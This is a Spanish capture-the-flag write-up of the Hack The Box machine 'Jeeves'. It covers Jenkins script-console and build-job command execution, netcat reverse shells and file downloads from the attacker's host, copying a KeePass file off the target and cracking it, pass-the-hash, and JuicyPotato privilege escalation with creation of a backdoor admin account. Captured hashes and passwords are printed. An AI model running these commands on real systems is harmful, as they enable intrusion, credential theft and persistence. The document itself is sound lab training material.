---
layout: single
title: Hack The Box - Jeeves 
excerpt: "Jeeves es una máquina de HackTheBox de dificultad media que permite explotar un Jenkins de dos maneras distintas para obtener una shell como usuario. La escalada de privilegios también se puede lograr de dos formas: aprovechando un archivo KeePass o abusando de un privilegio asignado al usuario para elevar sus permisos."
date: 2025-08-23
classes: wide
header:
  teaser: /assets/images/htb-writeup-jeeves/jeeves.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hack The Box
  - Web Pentesting
  - Jenkins
tags:  
  - Keepass
  - SeImpersonatePrivilege


---
<style>
  body {
    margin: 0;
    padding: 0;
    background-color: #0b101b;
    font-family: Arial, sans-serif;
    color: white;
  }

  /* Centramos únicamente los elementos visuales */
  .glitch,
  .title,
  .date,
  .info {
    text-align: center;
    margin-left: auto;
    margin-right: auto;
  }

  .glitch {
    position: relative;
    width: 90%;
    max-width: 400px;
    height: 300px;
    background-image: url("/assets/images/htb-writeup-jeeves/jeeves.png");
    background-size: cover;
    background-position: center;
    margin: 2rem auto 1rem auto;
    overflow: hidden;
  }

  .glitch:before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url("/assets/images/htb-writeup-jeeves/jeeves.png");
    background-size: cover;
    background-position: center;
    opacity: 0.5;
    mix-blend-mode: hard-light;
    animation: glitch2 10s linear infinite;
  }

  .glitch:hover:before {
    animation: glitch1 1s linear infinite;
  }

  @keyframes glitch1 {
    0% { background-position: 0 0; filter: hue-rotate(0deg); }
    10% { background-position: 5px 0; }
    20% { background-position: -5px 0; }
    30% { background-position: 15px 0; }
    40% { background-position: -5px 0; }
    50% { background-position: -25px 0; }
    60% { background-position: -50px 0; }
    70% { background-position: 0 -20px; }
    80% { background-position: -60px -20px; }
    81% { background-position: 0 0; }
    100% { background-position: 0 0; filter: hue-rotate(360deg); }
  }

  @keyframes glitch2 {
    0% { background-position: 0 0; filter: hue-rotate(0deg); }
    10% { background-position: 15px 0; }
    15% { background-position: -15px 0; }
    20% { filter: hue-rotate(360deg); }
    25% { background-position: 0 0; filter: hue-rotate(0deg); }
    100% { background-position: 0 0; filter: hue-rotate(0deg); }
  }

  .title {
    font-size: 1.5rem;
    font-weight: bold;
    margin-bottom: 0.5rem;
  }

  .date {
    font-size: 1rem;
    color: #ccc;
    margin-bottom: 1rem;
  }

  .info {
    display: flex;
    justify-content: center;
    gap: 2rem;
    flex-wrap: wrap;
    margin-top: 1rem;
    font-size: 0.9rem;
  }

  .info div {
    text-align: center;
  }

  .info .label {
    color: #999;
    font-size: 0.8rem;
  }

  .icon {
    font-size: 2rem;
    color: #0f0;
    margin: 0.5rem 0;
  }

  /* Responsive */
  @media (max-width: 575.5px) {
    .glitch {
      height: 200px;
    }
    .title {
      font-size: 1.3rem;
    }
  }
</style>

<body>
    <div class="glitch">  
    </div>
</body>

<br>

`Jeeves` Jeeves es una máquina de HackTheBox de dificultad media que permite explotar un Jenkins de dos maneras distintas para obtener una shell como usuario. La escalada de privilegios también se puede lograr de dos formas: aprovechando un archivo KeePass o abusando de un privilegio asignado al usuario para elevar sus permisos.

## Enumeración

Realizando un escaneo de puertos TCP identifique los siguientes abiertos:

```bash
Nmap scan report for 10.10.10.63
Host is up, received user-set (0.23s latency).
Scanned at 2025-08-01 16:22:48 EDT for 13s

PORT      STATE    SERVICE      REASON          VERSION
80/tcp    open     http         syn-ack ttl 127 Microsoft IIS httpd 10.0
135/tcp   filtered msrpc        no-response
445/tcp   open     microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp filtered ibm-db2      no-response
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
```
## Enumeración WEB 

La pagina web de la pagina es la siguiente:

![](/assets/images/htb-writeup-jeeves/ask.png)

Parece ser que se trata de un servidor jenkins. Al realizar la enumeración del portal, incluyendo el escaneo de archivos, directorios y la búsqueda de posibles vectores de ataque, no encontré ningún elemento que resultara útil o relevante para avanzar.

Revisando el puerto 50000 me encontré lo siguiente:

![](/assets/images/htb-writeup-jeeves/404.png)

Posteriormente, realice una enumeración de archivos y directorios con gobuster donde encontré la ruta `askjeeves` 


```bash
┌──(root㉿kali)-[/opt/chuleta]
└─# gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -k -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.63:50000/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/askjeeves            (Status: 302) [Size: 0] [--> http://10.10.10.63:50000/askjeeves/]
```

Al consultar la ruta me encontré con el servidor jenkins

![](/assets/images/htb-writeup-jeeves/wel.png)

Intente probar credenciales débiles o por defecto pero no pude ingresar al portal 

![](/assets/images/htb-writeup-jeeves/inva.png)

También intente buscar exploits para esta versión de Jenkins `2.87` pero no encontré ninguna que pueda darme un acceso inicial, algo interesante es que tiene habilitado la opción `Manage Jenkins` también consultando la ruta `script` puedo ejecutar comandos utilizando groovy 

![](/assets/images/htb-writeup-jeeves/scri.png)

Una vez que tengo una vía para ejecutar comandos puedo compartirme `netcat.exe` y enviare una reverse shell a mi equipo, primero creare una carpeta compartida por smb con impacket y llamare a netcat para generar a reverse shell

![](/assets/images/htb-writeup-jeeves/impa.png)

La ejecución fallo debido al carácter \ que parece interpretarlo como si quisiera escapara el carácter siguiente, para arreglarlo simplemente agregar una barra invertida mas para de esta manera decirle que el carácter que quiero ejecutar es la barra invertida y no estoy tratando de escapar nada.

```bash
println "\\\\10.10.16.5\\smbFolder\\nc.exe -e cmd 10.10.16.5 443".execute().text
```
De esta manera pude obtener una shell en la máquina

```bash
┌──(root㉿kali)-[/opt]
└─# impacket-smbserver smbFolder $(pwd) -smb2support


Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.63,49676)
[*] AUTHENTICATE_MESSAGE (JEEVES\kohsuke,JEEVES)
[*] User JEEVES\kohsuke authenticated successfully
[*] kohsuke::JEEVES:aaaaaaaaaaaaaaaa:00ad15b45f2bcfa6541bf3a3e3ace0d2:01010000000000008020e07d8205dc01501ec613fe9d88cd000000000100100047004e006700770045006b00720046000300100047004e006700770045006b0072004600020010005500460063007000700070006f004600040010005500460063007000700070006f004600070008008020e07d8205dc010600040002000000080030003000000000000000000000000030000090a62a12549ce43fd1dc378eb336c4203b93600dc55d60edc8deaeef7e28e67d0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003500000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
[*] AUTHENTICATE_MESSAGE (\,JEEVES)
[*] User JEEVES\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] AUTHENTICATE_MESSAGE (\,JEEVES)
[*] User JEEVES\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] AUTHENTICATE_MESSAGE (\,JEEVES)
[*] User JEEVES\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Disconnecting Share(1:IPC$)
[*] AUTHENTICATE_MESSAGE (\,JEEVES)
[*] User JEEVES\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] AUTHENTICATE_MESSAGE (\,JEEVES)
[*] User JEEVES\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] AUTHENTICATE_MESSAGE (\,JEEVES)
[*] User JEEVES\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
```
```bash
┌──(root㉿kali)-[/opt/]
└─# rlwrap nc -lvp 443
listening on [any] 443 ...
10.10.10.63: inverse host lookup failed: Unknown host
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.63] 49677
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>whoami
whoami
jeeves\kohsuke

C:\Users\Administrator\.jenkins>
```
## Freestyle project

Otra forma de lograr la ejecución de comandos es creando un nuevo trabajo (Freestyle project)

![](/assets/images/htb-writeup-jeeves/free.png)

En la sección `build` donde se configura el proyecto hay una sección que permite ejecutar comandos de Windows por lotes

![](/assets/images/htb-writeup-jeeves/build.png)

Probé ejecutando el comando dir y funciono con éxito

![](/assets/images/htb-writeup-jeeves/dir.png)

Para ejecutar el proyecto debe seleccionarse la opción `Build Now`

![](/assets/images/htb-writeup-jeeves/buildn.png)

Esto genera un valor en`Build Histroy` al consultarlo y seleccionar la opción `Console output`se puede ver el resultado del comando ejecutado (El color azul indica que la ejecución fue exitosa en caso de tener un color rojo indica que se presento un error)

![](/assets/images/htb-writeup-jeeves/buildh.png)

![](/assets/images/htb-writeup-jeeves/console.png)

![](/assets/images/htb-writeup-jeeves/output.png)

Una vez que vi que tengo esta vía para ejecutar comandos le cargue `netcat.exe` al servidor seleccionando la opción `configure` para modificar los comandos, probé con IEX, iwr y curl pero obtenía el error `'iwr' is not recognized as an internal or external command, operable program or batch file`

![](/assets/images/htb-writeup-jeeves/iwr.png)

![](/assets/images/htb-writeup-jeeves/fail.png)

para poder lograr la ejecución de los comandos utilice la sig. sintaxis: 

```bash
powershell -Command "iwr http://10.10.16.3/nc.exe -outf .\nc.exe"
```
![](/assets/images/htb-writeup-jeeves/pe.png)

```bash
┌──(root㉿kali)-[/opt]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.63 - - [01/Aug/2025 18:01:15] "GET /nc.exe HTTP/1.1" 200 -
```
Ahora con netcat cargado obtuve una reverse shell con el comando:

```bash
.\nc.exe 10.10.16.3 443 -e cmd.exe
```
```bash
┌──(root㉿kali)-[/opt]
└─# rlwrap nc -lvp 443
listening on [any] 443 ...
10.10.10.63: inverse host lookup failed: Unknown host
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.63] 49679
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins\workspace\test>whoami
whoami
jeeves\kohsuke

C:\Users\Administrator\.jenkins\workspace\test>
```
## Escalada de privilegios

## Metodo 1 - Keepass

En el directorio documentos hay un archivo keepass, lo primero que realice fue copiarlo a mi maquina de atacante mediante mi recurso compartido creado anteriormente 

```bash
C:\Users\kohsuke\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\kohsuke\Documents

11/03/2017  11:18 PM    <DIR>          .
11/03/2017  11:18 PM    <DIR>          ..
09/18/2017  01:43 PM             2,846 CEH.kdbx
               1 File(s)          2,846 bytes
               2 Dir(s)   2,674,241,536 bytes free
```

```bash
C:\Users\kohsuke\Documents>copy CEH.kdbx \\10.10.16.5\smbFolder\CEH.kdbx
copy CEH.kdbx \\10.10.16.5\smbFolder\CEH.kdbx
        1 file(s) copied.
```
```bash
┌──(root㉿kali)-[/home/kali/a]
└─# impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.63,49678)
[*] AUTHENTICATE_MESSAGE (JEEVES\kohsuke,JEEVES)
[*] User JEEVES\kohsuke authenticated successfully
[*] kohsuke::JEEVES:aaaaaaaaaaaaaaaa:a367abd319a969fbc3c5ad8d20280c42:010100000000000000ad198a8505dc0114869acfa880ac97000000000100100063006a006c0079007a004b00580066000300100063006a006c0079007a004b0058006600020010006d004f00550065006500700069007900040010006d004f005500650065007000690079000700080000ad198a8505dc010600040002000000080030003000000000000000000000000030000090a62a12549ce43fd1dc378eb336c4203b93600dc55d60edc8deaeef7e28e67d0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003500000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
[*] Disconnecting Share(1:IPC$)
```
Posteriormente lo abrí con `keepassxc` sin embargo pide la contraseña maestra 

![](/assets/images/htb-writeup-jeeves/kee.png)

En este punto use `keepass2john` para poder obtener un hash y usar john para romperlo y encontrar la contraseña maestra 

```bash
┌──(root㉿kali)-[/home/kali/a]
└─# keepass2john CEH.kdbx 
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48

┌──(root㉿kali)-[/home/kali/a]
└─# john hash_keepass --wordlist=/usr/share/wordlists/rockyou.txt    
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)     
1g 0:00:01:22 DONE (2025-08-04 17:35) 0.01207g/s 663.5p/s 663.5c/s 663.5C/s nando1..moonshine1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Finalmente ingrese la contraseña y pude acceder sin problemas

![](/assets/images/htb-writeup-jeeves/passk.png)

Revisando la contraseña de Backup stuff veo que se trata de un hash NTLM valide si correspondía al usuario administrador con nxc y marco un pwned 

```bash
┌──(root㉿kali)-[/opt/chuleta]
└─# nxc smb 10.10.10.63 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00'
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
```
Finalmente entre a la maquina como administrador utilizando `psexec` haciendo  pass-the-hash

```bash
┌──(root㉿kali)-[/opt/chuleta]
└─# impacket-psexec Administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file QxdFhJMa.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service vYuf on 10.10.10.63.....
[*] Starting service vYuf.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```
## Metodo 2 - SeImpersonatePrivilege

Revisando los privilegios de mi usuario  vi que tenia habilitado el privilegio `SeImpersonatePrivilege`

```bash
C:\Users\Administrator\.jenkins\workspace\test>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```
Por lo cual cargué Juicy potato en la maquina para poder escalar privilegios 

```bash
┌──(root㉿kali)-[/opt]
└─# impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
uicyPotat[*] Incoming connection (10.10.10.63,49679)
[*] AUTHENTICATE_MESSAGE (\,JEEVES)
[*] User JEEVES\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[-] SMB2_TREE_CONNECT not found smbFolderJuicyPotato.exe
[-] SMB2_TREE_CONNECT not found smbFolderJuicyPotato.exe
[*] Disconnecting Share(1:IPC$)
[*] Closing down connection (10.10.10.63,49679)
[*] Remaining connections []
[*] Incoming connection (10.10.10.63,49680)
[*] AUTHENTICATE_MESSAGE (\,JEEVES)
[*] User JEEVES\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:smbFolder)
[*] Closing down connection (10.10.10.63,49680)
[*] Remaining connections []


C:\Users\Administrator\Desktop> copy \\10.10.16.5\smbFolder\JuicyPotato.exe
        1 file(s) copied.
```
Posteriormente me envié una shell utilizando Juicy Potato 

```bash
C:\Users\kohsuke\Desktop>JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Users\kohsuke\Desktop\nc.exe -e cmd 10.10.16.5 4443" -l 1337 
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Users\kohsuke\Desktop\nc.exe -e cmd 10.10.16.5 4443" -l 1337 
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
...........................................
C:\Users\kohsuke\Desktop>

┌──(root㉿kali)-[/opt]
└─# nc -lvp 4443                                    
listening on [any] 4443 ...
10.10.10.63: inverse host lookup failed: Unknown host
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.63] 49697
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```
También es posible crear un usuario y agregarlo al grupo administradores 

```bash
C:\Users\kohsuke\Desktop>JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user SrP3rr1n Admin123. /add" -l 1337 
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user SrP3rr1n Admin123. /add" -l 1337 
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\Users\kohsuke\Desktop>net users
net users

User accounts for \\JEEVES

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
kohsuke                  SrP3rr1n                 
The command completed successfully.

C:\Users\kohsuke\Desktop>
```
```bash
C:\Users\kohsuke\Desktop>JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators SrP3rr1n /add " -l 1337 
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators SrP3rr1n /add " -l 1337 
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```
Sin embargo, tras validar las credenciales veo que son validas pero no me marca el pwned

```bash
┌──(root㉿kali)-[/opt/chuleta]
└─# nxc smb 10.10.10.63 -u SrP3rr1n -p 'Admin123.'                            
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [+] Jeeves\SrP3rr1n:Admin123. 
```
Para poder tener el pwned ejecute lo siguiente:

```bash
C:\Users\kohsuke\Desktop>JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337 
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337 
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\Users\kohsuke\Desktop>
```

```bash
┌──(root㉿kali)-[/opt/]
└─# nxc smb 10.10.10.63 -u SrP3rr1n -p 'Admin123.'
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [+] Jeeves\SrP3rr1n:Admin123. (Pwn3d!)
```
Con esto ya puedo iniciar sesión con `psexec`

```bash
┌──(root㉿kali)-[/opt/chuleta]
└─# impacket-psexec WORKGROUP/SrP3rr1n@10.10.10.63 cmd.exe  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file avJUuubq.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service tayp on 10.10.10.63.....
[*] Starting service tayp.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```
En este caso esto funciono por que se tienen permisos de escritura en el recurso compartido`ADMIN$` en dado caso de que no tuviéramos permisos de escritura en ningún recurso compartido se debe crear uno 

```bash
C:\Users\kohsuke\Desktop>JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Users\kohsuke\Desktop /GRANT:Adminsitrators,FULL" -l 1337 
```
Al intentar consultar la bandera del administrador vi que solo había un archivo hm.txt el cual indicaba que la bandera esta en algún lugar.

```bash
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,671,812,608 bytes free

C:\Users\Administrator\Desktop> type hm.txt
The flag is elsewhere.  Look deeper.
```
Parece que aquí se esta utilizando ADS (Alternate Data Streams) es una característica del sistema de archivos **NTFS** que permite **adjuntar múltiples flujos de datos a un solo archivo**, sin que estos sean visibles. Para poder ver los ADS simplemente ejecutar: `dir /s /r`

```bash
C:\Users\Administrator\Desktop> dir /s /r 
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes

     Total Files Listed:
               2 File(s)            833 bytes
               2 Dir(s)   2,671,804,416 bytes free
```

Con la salida anterior se observa que el archivo `hm.txt` tiene un ADS oculto: `root.txt` para poder ver su contenido utilice el comando `more` 

```bash
C:\Users\Administrator\Desktop> more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530

C:\Users\Administrator\Desktop> 
```
